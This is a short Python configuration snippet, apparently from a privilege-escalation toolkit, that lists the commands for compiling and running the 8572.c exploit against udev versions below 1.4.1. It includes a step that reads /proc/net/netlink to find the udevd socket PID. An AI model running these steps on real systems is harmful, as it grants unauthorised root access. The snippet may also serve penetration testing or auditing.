"""
Privilege Escalation script for the 8572.c exploit
"""
vulnerable_versions = {
	"udev < 1.4.1"
}
compilation_cmd = "gcc -o 8572 8572.c"
prerequisite_cmd = "cat /proc/net/netlink"
escalation_cmd = "./8572 \{pid of udevd netlink socket (from output of {})\}".format(prerequisite_cmd)
